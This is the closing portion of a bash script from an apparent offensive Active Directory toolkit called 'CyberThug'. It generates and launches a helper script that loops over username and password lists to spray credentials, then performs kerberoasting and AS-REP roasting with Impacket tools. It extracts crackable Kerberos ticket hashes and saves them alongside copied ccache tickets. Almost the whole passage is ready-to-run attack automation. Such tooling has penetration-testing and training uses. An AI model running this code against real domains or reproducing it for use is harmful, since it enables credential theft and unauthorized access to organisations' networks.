                if [ -s /tmp/.tgs1.txt.\$u ]; then
                    echo \$u > /tmp/.current_u.txt 
                    targeted_kerberoast_check
                    break
                fi          
            done < $Password
        done < /tmp/.test1_nxc_rid_brute
    else
        echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host \"$DC\" -u \"$User\" -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m"
        echo ""
        for i in \$(cat $Password); do
 	    if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
                 echo -e "\033[31m[+]-- Getting TGT for => $User --[+]\033[0m"      
                 getTGT.py $CLEAN_DOMAIN/$User:\$i -dc-ip $DC -k 2>/dev/null
                 if [ -f  $User.ccache ]; then
                      export KRB5CCNAME=$User.ccache
                 fi
                 echo ""  
            fi   
            python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $User -p \$i -d $CLEAN_DOMAIN $flag > /tmp/.tgs.\$i 2>/dev/null
            grep '^\\\$krb5tgs\\\$' /tmp/.tgs.\$i > /tmp/.tgs1.txt.\$i
            cat /tmp/.tgs1.txt.\$i
            cp /tmp/.tgs1.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
            if [ -s /tmp/.tgs1.txt.\$i ]; then
 	        u="\$i"
                echo \$u > /tmp/.current_u.txt   
                targeted_kerberoast_check
                break  
            fi 
        done 
    fi 
else
    echo -e "\033[36m[+]-- Running targetedKerberoast.py -v --dc-host \"$DC\" -u \"$User\" -p \"$Password\" -d \"$CLEAN_DOMAIN\" $flag --[+]\033[0m"
    echo ""  
    if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
            echo -e "\033[31m[+]-- Getting TGT for => $User --[+]\033[0m"      
            getTGT.py $CLEAN_DOMAIN/$User:$Password -dc-ip $DC -k 2>/dev/null
            if [ -f $User.ccache ]; then
                 export KRB5CCNAME=$User.ccache
	    fi
            echo ""  
    fi   
    python3 $HOME/Downloads/tools/Folders/targetedKerberoast/targetedKerberoast.py -v --dc-host $DC -u $User -p $Password -d $CLEAN_DOMAIN $flag > /tmp/.tgs.$User 2>/dev/null
    grep '^\\\$krb5tgs\\\$' /tmp/.tgs.$User > /tmp/.tgs1.txt.$User
    cat /tmp/.tgs1.txt.$User
    cp /tmp/.tgs1.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/targetedkerberoast_tgs_$DOMAIN_$DATE 2>/dev/null
    echo "" 
    if [ -s /tmp/.tgs1.txt.$User ]; then
         u="$User"
         echo \$u > /tmp/.current_u.txt   
         targeted_kerberoast_check
    fi            
fi  
echo -e "\033[36m[+]-- Running mssqlclient.py -windows-auth \"$CLEAN_DOMAIN\"/\"$User\":\"$Password\"@\"$Ip\" --[+]\033[0m"
echo ""
timeout 5 mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip > /tmp/mssql.txt
if [[ \$(wc -l < /tmp/mssql.txt) -gt 5 ]]; then
    gnome-terminal -- bash -c "echo -e '\e[1;32m[+]-- Running mssqlclient.py on \"$CLEAN_DOMAIN\" --[+]\e[0m' ; echo '' ; mssqlclient.py -windows-auth $CLEAN_DOMAIN/$User:$Password@$Ip ; exec bash"
fi  
echo ""
if [[ \$(wc -l < /tmp/.test1_nxc_rid_brute) -gt 1 ]]; then
    if [[ -f "$User" && -f "$Password" ]]; then
            echo "" 
            echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
            echo ""
            for i in {1..15}; do
                dots=\$(( (i - 1) % 3 + 1 ))
                echo -ne "\r\033[31mProcessing \$(printf %-\${dots}s | tr ' ' '.')\033[0m"
                sleep 0.1
            done
            echo ""
            GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
            grep '^\\\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
            cat /tmp/.asrep1.txt
            cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
            echo ""
            if [[ -s /tmp/.asrep1.txt ]]; then
	         getnpusers_check
            fi
            echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"//tmp/.test1_nxc_rid_brute:\"$Password\" -request $dc_host $flag --[+]\033[0m"
            while read -r u; do
                while read -r p; do
                    echo ""
                    echo -e "\033[36m\$u\033[0m" 
                    GetUserSPNs.py "$CLEAN_DOMAIN/\$u:\$p" -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.\$u
                    if [[ -s /tmp/.getuserspn-req11.txt.\$u ]]; then
                 	cp /tmp/.getuserspn-req11.txt.\$u /tmp/.getuserspn-req2.txt.\$u
                 	echo "\$u" > /tmp/.current_iii.txt
                 	getuserspns1_check
                 	cat /tmp/.getuserspn-req2.txt.\$u
                 	cp /tmp/.getuserspn-req2.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
                 	rm /tmp/.getuserspn-req2.txt.\$u 2>/dev/null
                    fi
                done < $Password
            done < /tmp/.test1_nxc_rid_brute
            echo ""
            echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
            for i in \$(cat /tmp/.test1_nxc_rid_brute); do
                echo ""
                echo -e "\033[36m\$i\033[0m" 
                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
                if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                    cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                    echo "\$i" > /tmp/.current_i.txt
		    getuserspns_check
                    cat /tmp/.getuserspn.txt.\$i
                    cp /tmp/.getuserspn.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                    rm /tmp/.getuserspn.txt.\$i 2>/dev/null
                fi
            done
    elif [[ -f "$User" ]]; then
            echo ""
            echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
            echo ""
            for i in {1..15}; do
                dots=\$(( (i - 1) % 3 + 1 ))
                echo -ne "\r\033[31mProcessing \$(printf %-\${dots}s | tr ' ' '.')\033[0m"
                sleep 0.1
            done
            echo ""
            GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
            grep '^\\\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
            cat /tmp/.asrep1.txt
            cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
            echo ""
            if [[ -s /tmp/.asrep1.txt ]]; then
		getnpusers_check
            fi
            echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"/tmp/.test1_nxc_rid_brute:\"$Password\" -request $dc_host $flag --[+]\033[0m"
            while read -r u; do
                echo ""
                echo -e "\033[36m\$u\033[0m" 
                GetUserSPNs.py $CLEAN_DOMAIN/\$u:$Password -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.\$u
                    if [[ -s /tmp/.getuserspn-req11.txt.\$u ]]; then
                        cp /tmp/.getuserspn-req11.txt.\$u /tmp/.getuserspn-req2.txt.\$u
                        echo "\$u" > /tmp/.current_iii.txt
                        getuserspns1_check
                        cat /tmp/.getuserspn-req2.txt.\$u
                        cp /tmp/.getuserspn-req2.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
                        rm /tmp/.getuserspn-req2.txt.\$u 2>/dev/null
                    fi
            done < /tmp/.test1_nxc_rid_brute
            echo ""
            echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
            for i in \$(cat /tmp/.test1_nxc_rid_brute); do
                echo ""
                echo -e "\033[36m\$i\033[0m"
                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
                if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                    cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                    echo "\$i" > /tmp/.current_i.txt
		    getuserspns_check
                    cat /tmp/.getuserspn.txt.\$i
                    cp /tmp/.getuserspn.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                    rm /tmp/.getuserspn.txt.\$i 2>/dev/null
                fi
            done
    elif [[ -f "$Password" ]]; then
            echo ""
            echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
            echo ""
            for i in {1..15}; do
                dots=\$(( (i - 1) % 3 + 1 ))
                echo -ne "\r\033[31mProcessing \$(printf %-\${dots}s | tr ' ' '.')\033[0m"
                sleep 0.1
            done
            echo ""            
            GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
            grep '^\\\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
            cat /tmp/.asrep1.txt
            cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
            echo ""
            if [[ -s /tmp/.asrep1.txt ]]; then
                getnpusers_check
            fi
            echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
                while read -r p; do
                    echo ""
                    echo -e "\033[36m\$User\033[0m" 
                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.$User
                    if [[ -s /tmp/.getuserspn-req11.txt.$User ]]; then
                        cp /tmp/.getuserspn-req11.txt.$User /tmp/.getuserspn-req2.txt.$User
                        echo "$User" > /tmp/.current_iii.txt
                        getuserspns1_check
                        cat /tmp/.getuserspn-req2.txt.$User
                        cp /tmp/.getuserspn-req2.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
                        rm /tmp/.getuserspn-req2.txt.$User 2>/dev/null
                    fi
                done < $Password
            echo ""
            echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
            for i in \$(cat /tmp/.test1_nxc_rid_brute); do 
                echo ""
                echo -e "\033[36m\$i\033[0m"
                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
                if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                    cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                    echo "\$i" > /tmp/.current_i.txt
		    getuserspns_check
                    cat /tmp/.getuserspn.txt.\$i
                    cp /tmp/.getuserspn.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                    rm /tmp/.getuserspn.txt.\$i 2>/dev/null
                fi         
            done
    else
            echo ""  
            echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
            echo ""
            for i in {1..15}; do
                dots=\$(( (i - 1) % 3 + 1 ))
                echo -ne "\r\033[31mProcessing \$(printf %-\${dots}s | tr ' ' '.')\033[0m"
                sleep 0.1
            done
            echo ""            
            GetNPUsers.py -no-pass -usersfile /tmp/.test1_nxc_rid_brute $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
            grep '^\\\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
            cat /tmp/.asrep1.txt
            cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
            echo ""
            if [[ -s /tmp/.asrep1.txt ]]; then
                getnpusers_check
            fi
            echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
            echo ""
            echo -e "\033[36m\$User\033[0m" 
            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.$User
            if [[ -s /tmp/.getuserspn-req11.txt.$User ]]; then
                   cp /tmp/.getuserspn-req11.txt.$User /tmp/.getuserspn-req2.txt.$User
                   echo "$User" > /tmp/.current_iii.txt
                   getuserspns1_check
                   cat /tmp/.getuserspn-req2.txt.$User
                   cp /tmp/.getuserspn-req2.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
                   rm /tmp/.getuserspn-req2.txt.$User 2>/dev/null
            fi
            echo ""
            echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth /tmp/.test1_nxc_rid_brute -usersfile /tmp/.test1_nxc_rid_brute -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
            for i in \$(cat /tmp/.test1_nxc_rid_brute); do
                echo ""
                echo -e "\033[36m\$i\033[0m"
                GetUserSPNs.py -no-preauth "\$i" -usersfile /tmp/.test1_nxc_rid_brute -dc-host $DC $CLEAN_DOMAIN/ | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
                if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                    cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
		    getuserspns_check
	            echo "\$i" > /tmp/.current_i.txt
                    cat /tmp/.getuserspn.txt.\$i
                    cp /tmp/.getuserspn.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                    rm /tmp/.getuserspn.txt.\$i 2>/dev/null
                fi
            done
    fi
else
    if [[ -f "$User" && -f "$Password" ]]; then
        echo ""
        echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
        while read -r u; do 
            while read -r p; do
                echo ""
                echo -e "\033[36m\$u\033[0m" 
                GetUserSPNs.py $CLEAN_DOMAIN/\$u:\$p -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.\$u
                if [[ -s /tmp/.getuserspn-req11.txt.\$u ]]; then
                        cp /tmp/.getuserspn-req11.txt.\$u /tmp/.getuserspn-req2.txt.\$u
                        echo "\$u" > /tmp/.current_iii.txt
                        getuserspns1_check
                        cat /tmp/.getuserspn-req2.txt.\$u
                        cp /tmp/.getuserspn-req2.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
                        rm /tmp/.getuserspn-req2.txt.\$u 2>/dev/null
                fi
            done < $Password
        done < $User
        echo ""
        echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile \"$User\" $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
        echo ""
        for i in {1..15}; do
           dots=\$(( (i - 1) % 3 + 1 ))
           echo -ne "\r\033[31mProcessing \$(printf %-\${dots}s | tr ' ' '.')\033[0m"
           sleep 0.1
        done
        echo ""        
        GetNPUsers.py -no-pass -usersfile $User $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
        grep '^\\\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
        cat /tmp/.asrep1.txt
        cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
        echo "" 
        if [[ -s /tmp/.asrep1.txt ]]; then
            getnpusers_check
        fi
        echo ""
        echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth \"$User\" -usersfile \"$User\" -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
        for i in \$(cat $User); do
            echo ""
            echo -e "\033[36m\$i\033[0m"
            GetUserSPNs.py -no-preauth "\$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
            if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                echo "\$i" > /tmp/.current_i.txt
		getuserspns_check
                cat /tmp/.getuserspn.txt.\$i
                cp /tmp/.getuserspn.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                rm /tmp/.getuserspn.txt.\$i 2>/dev/null
            fi 
        done
    elif [[ -f "$User" ]]; then
        echo ""
        echo -e "\033[36m[+]-- Running GetNPUsers.py -no-pass -usersfile \"$User\" $CLEAN_DOMAIN/ $dc_host --[+]\033[0m"
        echo ""
        for i in {1..15}; do
           dots=\$(( (i - 1) % 3 + 1 ))
           echo -ne "\r\033[31mProcessing \$(printf %-\${dots}s | tr ' ' '.')\033[0m"
           sleep 0.1
        done
        echo ""   
        GetNPUsers.py -no-pass -usersfile $User $CLEAN_DOMAIN/ $dc_host > /tmp/.asrep.txt 2>/dev/null
        grep '^\\\$krb5asrep' /tmp/.asrep.txt > /tmp/.asrep1.txt
        cat /tmp/.asrep1.txt
        cp /tmp/.asrep1.txt $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getnpusers_asrep_$DOMAIN_$DATE 2>/dev/null
        echo "" 
        if [[ -s /tmp/.asrep1.txt ]]; then
           getnpusers_check
        fi
        echo ""
        echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
        while read -r u; do
            echo ""
            echo -e "\033[36m\$u\033[0m" 
            GetUserSPNs.py $CLEAN_DOMAIN/\$u:$Password -request $dc_host $flag | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.\$u
            if [[ -s /tmp/.getuserspn-req11.txt.\$u ]]; then
                 cp /tmp/.getuserspn-req11.txt.\$u /tmp/.getuserspn-req2.txt.\$u
                 echo "\$u" > /tmp/.current_iii.txt
	         getuserspns1_check
                 cat /tmp/.getuserspn-req2.txt.\$u
                 cp /tmp/.getuserspn-req2.txt.\$u $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
                 rm /tmp/.getuserspn-req2.txt.\$u 2>/dev/null
            fi
        done < $User
        echo "" 
        echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth \"$User\" -usersfile $User -dc-host \"$DC\" \"$CLEAN_DOMAIN/\" --[+]\033[0m"
        for i in \$(cat $User); do
            echo ""
            echo -e "\033[36m\$i\033[0m"
            GetUserSPNs.py -no-preauth "\$i" -usersfile $User -dc-host $DC $CLEAN_DOMAIN/ 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn.txt.\$i
            if [[ -s /tmp/.getuserspn.txt.\$i ]]; then
                cp /tmp/.getuserspn.txt.\$i /tmp/.getuserspn1.txt.\$i
                echo "\$i" > /tmp/.current_i.txt
	        getuserspns_check
                cat /tmp/.getuserspn.txt.\$i
                cp /tmp/.getuserspn.txt.\$i $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn_tgs_$DOMAIN_$DATE 2>/dev/null
                rm /tmp/.getuserspn.txt.\$i 2>/dev/null
            fi  
        done
    elif [[ -f "$Password" ]]; then
            echo ""
            echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
                while read -r p; do
                    echo ""
                    echo -e "\033[36m\$User\033[0m" 
                    GetUserSPNs.py $CLEAN_DOMAIN/$User:\$p -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.$User
                    if [[ -s /tmp/.getuserspn-req11.txt.$User ]]; then
                        cp /tmp/.getuserspn-req11.txt.$User /tmp/.getuserspn-req2.txt.$User
                        echo "$User" > /tmp/.current_iii.txt
                        getuserspns1_check
                        cat /tmp/.getuserspn-req2.txt.$User
                        cp /tmp/.getuserspn-req2.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
                        rm /tmp/.getuserspn-req2.txt.$User 2>/dev/null
                    fi
                done < $Password
            echo ""
    else
            echo -e "\033[36m[+]-- Running GetUserSPNs.py \"$CLEAN_DOMAIN/\"\"$User\":\"$Password\" -request $dc_host $flag --[+]\033[0m"
            echo ""
            echo -e "\033[36m\$User\033[0m" 
            GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag 2>/dev/null | grep '^\\\$krb5tgs\\\$' >> /tmp/.getuserspn-req11.txt.$User
            if [[ -s /tmp/.getuserspn-req11.txt.$User ]]; then
                cp /tmp/.getuserspn-req11.txt.$User /tmp/.getuserspn-req2.txt.$User
                echo "$User" > /tmp/.current_iii.txt
                getuserspns1_check
                cat /tmp/.getuserspn-req2.txt.$User
                cp /tmp/.getuserspn-req2.txt.$User $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/getuserspn-req2_tgs_$DOMAIN_$DATE 2>/dev/null
                rm /tmp/.getuserspn-req2.txt.$User 2>/dev/null
            fi
            echo ""
    fi
fi
echo -e "\e[1;32m------------------[+] Finished [+]---------------------\e[0m"
EOF
            chmod +x /tmp/auto.sh
            targeted_kerberoast_check1
            getnpusers_check1
            getuserspns_check1 
            getuserspns1_check1
            cat /tmp/auto1.sh /tmp/auto.sh > /tmp/auto2.sh
            cat /tmp/auto3.sh /tmp/auto2.sh > /tmp/auto4.sh  
            cat /tmp/auto5.sh /tmp/auto4.sh > /tmp/auto6.sh
            cat /tmp/auto7.sh /tmp/auto6.sh > /tmp/auto8.sh  
            mv /tmp/auto8.sh /tmp/auto.sh 
	    sed -i "s|__\\\$DC__|$DC|g" /tmp/auto.sh
	    sed -i "s|__\\\$CLEAN_DOMAIN__|$CLEAN_DOMAIN|g" /tmp/auto.sh
	    sed -i "s|__\\\$Ip__|$Ip|g" /tmp/auto.sh
            sed -i "s|__\\\$Kerberos__|$Kerberos|g" /tmp/auto.sh
            gnome-terminal -- bash -c "bash /tmp/auto.sh ; exec bash"
fi 
DATE=$(date +%Y-%m-%d_%H-%M)
for file in $HOME/*.ccache; do
  cp "$file" "$HOME/CyberThug_output/tickets/$(basename "$file" .ccache)_$DATE.ccache" 2>/dev/null
done
for file in $HOME/Downloads/*.ccache; do
  cp "$file" "$HOME/CyberThug_output/tickets/$(basename "$file" .ccache)_$DATE.ccache" 2>/dev/null
done
for file in ./*.ccache; do
  cp "$file" "$HOME/CyberThug_output/tickets/$(basename "$file" .ccache)_$DATE.ccache" 2>/dev/null
done

main
echo ""
rm $HOME/Downloads/tools/Files/*.state 2>/dev/null ; rm -r $HOME/Downloads/tools/Files/reports 2>/dev/null 
echo -e "\e[1;32m------------------[+] Finished [+]---------------------\e[0m"


# TEMPLATE
# ---------------------------------
#    elif [[ "$tool" = "5" ]]; then
#      while true; do
#           history -a "$HISTFILE"
#           echo  -e "\033[35m
#           \033[0m"
#           echo "
#               1)
#           "
#           read_input number $'\033[35m# \033[0m'
#           if [[ "$number" == ".." ]]; then
#               history -a "$HISTFILE"
#               exec "$0" "$@"
#           elif [[ "$number" == "1" ]]; then
#               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
#               read_input User $'\033[35mEnter The User : \033[0m' 
#               read_input Password $'\033[35mEnter The Password : \033[0m' 
#               echo ""
#               echo -e "\033[36m[+]-- Running nxc smb $Domain -u $User -p $Password --users --[+]\033[0m"
#               echo ""
#               nxc smb $Domain -u $User -p $Password --users
#               echo ""
#           elif [[ "$number" == "exit" ]]; then
#               exit 0
#           else
#               echo ""
#               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
#           fi
#      done
#--------------------------------------
#    elif [[ "$tool" == "exit" ]]; then
                                                                           
                                                                       
